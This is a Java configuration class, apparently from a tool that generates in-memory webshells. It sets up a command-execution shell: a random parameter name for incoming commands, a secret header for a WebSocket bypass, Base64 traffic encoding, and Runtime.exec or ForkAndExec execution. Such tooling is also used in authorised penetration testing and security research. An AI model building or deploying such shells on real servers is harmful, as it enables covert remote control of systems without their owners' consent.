package com.reajason.javaweb.memshell.shelltool.command;

import com.reajason.javaweb.memshell.config.ConfigField;
import com.reajason.javaweb.memshell.config.HeaderAware;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.javaweb.utils.NameSampler;
import com.reajason.javaweb.utils.StringUtils;
import lombok.Builder;
import lombok.Getter;
import lombok.ToString;
import lombok.experimental.SuperBuilder;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
@Getter
@SuperBuilder
@ToString
public class CommandConfig extends ShellToolConfig implements HeaderAware {

    /**
     * 接收参数的请求头或请求参数名称
     */
    @ConfigField
    @Builder.Default
    private String paramName = NameSampler.sampleWord();

    /**
     * 只有在 WebSocket Bypass 的时候才有用，防止对业务的干扰。
     * 归在 BASIC 区（与 Proxy 的同名字段一致）：它只在 BypassNginx 挂载类型下才显示，
     * 而那时它是必填的"暗号"，收进「高级配置」只会让人找不到。
     */
    @ConfigField
    @Builder.Default
    private String headerName = "User-Agent";

    /**
     * 只有在 WebSocket Bypass 的时候才有用，防止对业务的干扰
     */
    @ConfigField
    @Builder.Default
    private String headerValue = CommonUtil.getRandomString(8);

    /**
     * 加密器
     */
    @ConfigField(group = ConfigField.Group.ADVANCED)
    @Builder.Default
    private Encryptor encryptor = Encryptor.RAW;

    /**
     * 实现类
     */
    @ConfigField(group = ConfigField.Group.ADVANCED)
    @Builder.Default
    private ImplementationClass implementationClass = ImplementationClass.RuntimeExec;

    /**
     * 命令执行模板，使用 {command} 作为占位符
     */
    @ConfigField(group = ConfigField.Group.ADVANCED)
    private String template;

    public static abstract class CommandConfigBuilder<C extends CommandConfig, B extends CommandConfig.CommandConfigBuilder<C, B>>
            extends ShellToolConfig.ShellToolConfigBuilder<C, B> {
        public B paramName(String paramName) {
            if (StringUtils.isNotBlank(paramName)) {
                paramName$value = paramName;
                paramName$set = true;
            }
            return self();
        }

        public B headerName(final String headerName) {
            if (StringUtils.isNotBlank(headerName)) {
                this.headerName$value = headerName;
                headerName$set = true;
            }
            return self();
        }

        public B headerValue(final String headerValue) {
            if (StringUtils.isNotBlank(headerValue)) {
                this.headerValue$value = headerValue;
                headerValue$set = true;
            }
            return self();
        }
    }


    public enum ImplementationClass {
        RuntimeExec, ForkAndExec;

        public static ImplementationClass fromString(String encryptor) {
            if (encryptor != null && encryptor.equals("ForkAndExec")) {
                return ForkAndExec;
            }
            return RuntimeExec;
        }
    }

    public enum Encryptor {
        RAW, BASE64, DOUBLE_BASE64;

        public static Encryptor fromString(String encryptor) {
            if (encryptor != null && encryptor.equals("DOUBLE_BASE64")) {
                return DOUBLE_BASE64;
            }
            if (encryptor != null && encryptor.equals("BASE64")) {
                return BASE64;
            }
            return RAW;
        }
    }
}
